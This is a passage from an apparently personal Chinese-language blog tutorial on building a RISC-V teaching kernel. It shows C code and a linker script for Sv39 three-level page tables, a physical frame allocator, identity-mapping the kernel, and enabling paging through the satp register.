&#123;</span><br><span class="line">                <span class="keyword">return</span> pte;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//如果此项页表为空</span></span><br><span class="line">            <span class="keyword">if</span> (!PageTableEntry_is_valid(pte)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//取出进入下级页表的物理页号</span></span><br><span class="line">        ppn = PageTableEntry_ppn(pte);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>有了<code>PTE</code>以及<code>VPN</code>还有<code>PT</code>，那么就可以建立虚拟地址与物理地址的之间的映射关系了：只需要将映射的物理页号与虚拟地址通过三级页表中的页表项对应起即可</li>
<li>该函数会根据指定的大小，将连续的虚拟地址映射到连续的物理地址。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PageTable_map</span><span class="params">(PageTable* pt,VirtAddr va, PhysAddr pa, u64 size ,<span class="type">uint8_t</span> pteflgs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;mappages: size&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PhysPageNum ppn = floor_phys(pa);</span><br><span class="line">    VirtPageNum vpn = floor_virts(va);</span><br><span class="line">    u64 last = (va.value + size - <span class="number">1</span>) / PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printk(&quot;ppn:%d\n&quot;,ppn.value);</span></span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        PageTableEntry* pte = find_pte_create(pt,vpn);</span><br><span class="line"></span><br><span class="line">        assert(!PageTableEntry_is_valid(pte));</span><br><span class="line">        *pte = PageTableEntry_new(ppn,PTE_V | pteflgs);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( vpn.value == last )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 一页一页映射</span></span><br><span class="line">        vpn.value+=<span class="number">1</span>;</span><br><span class="line">        ppn.value+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>取消映射关系</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PageTable_unmap</span><span class="params">(PageTable* pt, VirtPageNum vpn)</span></span><br><span class="line">&#123;</span><br><span class="line">    PageTableEntry* pte = find_pte(pt,vpn);</span><br><span class="line">    assert(!PageTableEntry_is_valid(pte));</span><br><span class="line">    *pte = PageTableEntry_empty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="3-开启MMU"><a href="#3-开启MMU" class="headerlink" title="3.开启MMU"></a>3.开启MMU</h1><h2 id="3-1内存初始化"><a href="#3-1内存初始化" class="headerlink" title="3.1内存初始化"></a>3.1内存初始化</h2><img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20240624202737775.png" alt="image-20240624202737775" style="zoom:80%;">

<ul>
<li>上图所示，内存由高到低排列，定义内核起始地址为<code>KERNBASE = 0x80200000</code>，</li>
<li>内核的代码被编译器编译后是由代码段和数据段组成的，可以在<code>os.map</code>中看见各段的地址空间，</li>
<li>代码段结束的地址设定为<code>etext</code>，数据段结束的地址设定为<code>kernelend</code>。</li>
<li>然后指定从内核结束后向上<code>128M</code>的空间为空闲内存，可以给应用使用的。</li>
</ul>
<blockquote>
<p>os.ld</p>
<ul>
<li>对链接文件进行修改，指定了链接脚本结束后按照页对齐</li>
<li>定义了两个符号：<code>PROVIDE(etext = .);</code>，<code>PROVIDE(kernelend = .);</code>，<code>etext</code>就代表了内核代码段结束的地址，<code>kernelend</code>就代表了内核结束的地址。</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH(riscv)</span><br><span class="line">ENTRY(_start)</span><br><span class="line"></span><br><span class="line">MEMORY</span><br><span class="line">&#123; </span><br><span class="line">	ram (rxai!w) : ORIGIN = 0x80200000, LENGTH = 128M</span><br><span class="line">&#125;</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">	skernel = .; /* 定义内核起始内存地址 */</span><br><span class="line">	.text : &#123;</span><br><span class="line">		*(.text .text.*)</span><br><span class="line">	. = ALIGN(0x1000);    /* text结束的地址按照页对齐 */</span><br><span class="line">    PROVIDE(etext = .);</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">	.rodata : &#123;</span><br><span class="line">		*(.rodata .rodata.*)</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">	.data : &#123;</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">		*(.sdata .sdata.*)</span><br><span class="line">		*(.data .data.*)</span><br><span class="line">		PROVIDE(_data_end = .);</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line"></span><br><span class="line">	.bss :&#123;</span><br><span class="line">		*(.sbss .sbss.*)</span><br><span class="line">		*(.bss .bss.*)</span><br><span class="line">		*(COMMON)</span><br><span class="line">	&#125; &gt;ram</span><br><span class="line">	PROVIDE(kernelend = .);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>初始化：</strong></p>
<p><strong>U模式下可用的内存是从<code>kernelend</code>开始到 <code>PHYSTOP</code>结束</strong></p>
<p>&#96;&#96;PHYSTOP<code>的定义为 </code>#define PHYSTOP (KERNBASE + 128<em>1024</em>1024)&#96; 即128M空间的大小</p>
<blockquote>
<p>address.c</p>
<p><code>PGROUNDDOWN</code> 宏：将地址向下取整到页边界。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">StackFrameAllocator FrameAllocatorImpl;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> kernelend[];</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PAGE_SIZE-1))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">frame_alloctor_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化时 kernelend 需向上取整</span></span><br><span class="line">    StackFrameAllocator_new(&amp;FrameAllocatorImpl);</span><br><span class="line">    StackFrameAllocator_init(&amp;FrameAllocatorImpl, \</span><br><span class="line">            ceil_phys(<span class="type">phys_addr_from_size_t</span>(kernelend)), \</span><br><span class="line">            ceil_phys(<span class="type">phys_addr_from_size_t</span>(PHYSTOP)));</span><br><span class="line">    printk(<span class="string">&quot;Memoery start:%p\n&quot;</span>,kernelend);</span><br><span class="line">    printk(<span class="string">&quot;Memoery end:%p\n&quot;</span>,PHYSTOP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-2-内存映射"><a href="#3-2-内存映射" class="headerlink" title="3.2 内存映射"></a>3.2 内存映射</h2><p>采用恒等映射：虚拟地址映射后的物理地址是相同的，这样在启用<code>mmu</code>后，原先的代码执行逻辑不变。 虚拟内存和物理内存恒等映射</p>
<p><img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20240624205428785.png" alt="虚拟内存和物理内存恒等映射"></p>
<blockquote>
<p>address.c</p>
<ul>
<li><code>kvmmake</code> 函数用于构建内核的页表，映射内核代码段和数据段到物理内存。<code>kvminit</code> 函数用于初始化内核页表。</li>
<li></li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">char</span> etext[];</span><br><span class="line"></span><br><span class="line">PageTable <span class="title function_">kvmmake</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    PageTable pt;</span><br><span class="line">    PhysPageNum root_ppn =  StackFrameAllocator_alloc(&amp;FrameAllocatorImpl);</span><br><span class="line">    pt.root_ppn = root_ppn;</span><br><span class="line">    printk(<span class="string">&quot;root_ppn:%p\n&quot;</span>,phys_addr_from_phys_page_num(root_ppn));</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;etext:%p\n&quot;</span>,(u64)etext);</span><br><span class="line">    <span class="comment">// // map kernel text executable and read-only.</span></span><br><span class="line">    PageTable_map(&amp;pt,<span class="type">virt_addr_from_size_t</span>(KERNBASE),<span class="type">phys_addr_from_size_t</span>(KERNBASE), \</span><br><span class="line">                    (u64)etext-KERNBASE , PTE_R | PTE_X | PTE_U) ;</span><br><span class="line">    printk(<span class="string">&quot;finish kernel text map!\n&quot;</span>);</span><br><span class="line">    <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of. </span></span><br><span class="line">    PageTable_map(&amp;pt,<span class="type">virt_addr_from_size_t</span>((u64)etext),<span class="type">phys_addr_from_size_t</span>((u64)etext ), \</span><br><span class="line">                    PHYSTOP - (u64)etext , PTE_R | PTE_W | PTE_U) ;</span><br><span class="line">    printk(<span class="string">&quot;finish kernel data and physical RAM map!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> pt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PageTable kernel_pagetable;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kvminit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  	kernel_pagetable = kvmmake();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>首先建立一个根页表，从空闲内存中拿出一页，然后映射内核代码段，再映射数据段，</strong>代码段的属性是可执行可读的，数据段的属性是可读可写的，且U模式不可访问。</li>
<li>由于我们现在是将U模式的应用和内核代码一起打包了，所以肯定U模式下的代码肯定是执行不了的，需要<strong>后面实现一个读取应用的模块来加载app</strong>。</li>
<li>然后是内核的映射表建立：<strong>内核的代码段只占两页内存： <code>0x80200000</code>,<code>0x80201000</code>，</strong>内核根页表放在<code>0x80250000</code>即空闲内存开始的第一页。虚拟地址<code>0x80200000</code>的三级页号的索引为 <strong>2 1 0</strong>，<code>0x80201000</code>的三级页号的索引为 <strong>2 1 1</strong>,</li>
<li>通过下图的三次查表就对应上了具体的物理内存</li>
</ul>
<p><img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20240624205704543.png" alt="image-20240624205704543"></p>
<h2 id="3-3-开启Sv39分页模式"><a href="#3-3-开启Sv39分页模式" class="headerlink" title="3.3 开启Sv39分页模式"></a>3.3 开启Sv39分页模式</h2><p>要开启<code>Sv39</code>的分页模式，只需要去写<code>satp</code>的值就行了：设置为<code>Sv39</code>分页模式，然后将<code>root_ppn</code>的值写入。这里有一个刷新<code>TLB</code>的操作。</p>
<p><strong>快表</strong> (TLB, Translation Lookaside Buffer) ， 它维护了部分虚拟页号到页表项的键值对。当 MMU 进行地址转换的时候，首先会到快表中看看是否匹配，如果匹配的话直接取出页表项完成地址转换而无需访存；否则再去查页表并将键值对保存在快表中。一旦我们修改 satp 就会切换地址空间，快表中的键值对就会失效（因为快表保存着老地址空间的映射关系，切换到新地址空间后，老的映射关系就没用了）。为了确保 MMU 的地址转换能够及时与 satp 的修改同步，我们需要立即使用 <code>sfence.vma</code> 指令将快表清空，这样 MMU 就不会看到快表中已经过期的键值对了。</p>
<blockquote>
<p>address.c</p>
<p>开启分页模式</p>
<p><code>kvminithart</code> 函数用于初始化当前 CPU 核心的页表。它会设置页表寄存器 <code>satp</code>，并刷新 TLB（Translation Lookaside Buffer），确保新页表的生效。</p>
<p><strong>宏定义</strong>：</p>
<ul>
<li><code>SATP_SV39</code>：表示 SV39 模式的 <code>satp</code> 值，高 4 位为 1000。</li>
<li><code>MAKE_SATP(pagetable)</code>：将页表地址与 <code>SATP_SV39</code> 组合成 <code>satp</code> 寄存器的值。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SATP_SV39 (8L &lt;&lt; 60)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAKE_SATP(pagetable) (SATP_SV39 | (((u64)pagetable)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kvminithart</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// wait for any previous writes to the page table memory to finish.</span></span><br><span class="line">  printk(<span class="string">&quot;satp:%lx\n&quot;</span>,MAKE_SATP(kernel_pagetable.root_ppn.value));</span><br><span class="line">  sfence_vma();</span><br><span class="line"></span><br><span class="line">  w_satp(MAKE_SATP(kernel_pagetable.root_ppn.value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// flush stale entries from the TLB.</span></span><br><span class="line">  sfence_vma();</span><br><span class="line">  <span class="type">reg_t</span> satp = r_satp();</span><br><span class="line"></span><br><span class="line">  printk(<span class="string">&quot;satp:%lx\n&quot;</span>,satp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>riscv.h</p>
<p>定义sfence和satp 两个函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// supervisor address translation and protection;</span></span><br><span class="line"><span class="comment">// holds the address of the page table.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">w_satp</span><span class="params">(<span class="type">reg_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw satp, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">reg_t</span> <span class="title function_">r_satp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">reg_t</span> x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, satp&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刷新 TLB.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">sfence_vma</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// the zero, zero means flush all TLB entries.</span></span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sfence.vma zero, zero&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h1><blockquote>
<p>main.c</p>
<p>修改</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">frame_alloctor_init</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">kvminit</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">kvminithart</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">os_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   printk(<span class="string">&quot;hello timer os!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 内存分配器初始化</span></span><br><span class="line">   frame_alloctor_init();</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//初始化内存</span></span><br><span class="line">   kvminit();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//映射内核</span></span><br><span class="line">   kvminithart();</span><br><span class="line"></span><br><span class="line">   <span class="comment">//trap初始化</span></span><br><span class="line">   trap_init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="comment">/* code */</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// task_init();</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// timer_init();</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="comment">// run_first_task();</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<blockquote>
<p>测试</p>
</blockquote>
<p>可见：</p>
<ul>
<li><code>root_ppn</code>：对齐到了<code>0x80250000</code> </li>
<li><code>etext</code>：对齐到了<code>0x80202000</code>  代码段</li>
</ul>
<p><img src="/2024/06/21/riscv-14-%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/ZL\source_posts\riscv-14-内存映射机制实现\image-20240624211356863.png" alt="image-20240624211356863"></p>
<h2 id="本节工作总结："><a href="#本节工作总结：" class="headerlink" title="本节工作总结："></a><strong>本节工作总结：</strong></h2><ul>
<li>首先对<code>PTE</code>和<code>PT</code>进行了定义，并且实现了将<code>PPN</code>转化为物理地址的函数</li>
<li>仿照<code>rcore</code>，实现了内存映射，即由<code>VPN</code>通过三级页表向<code>PPN</code>转换 目标是最终获取物理地址</li>
<li>然后，对内存进行了初始化，定义应用程序的内存空间，按照页对齐的方式对齐了<code>etext</code>代码段数据和 向下取整的方式对齐数据段<code>data</code>并且定义了内存初始化函数<code>frame_allocator_init()</code></li>
<li>采用恒等映射的方式，将虚拟地址映射到物理地址上去</li>
<li>最后设置<code>SATP</code>开启<code>Sv39</code>分页模式</li>
</ul>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
</search>
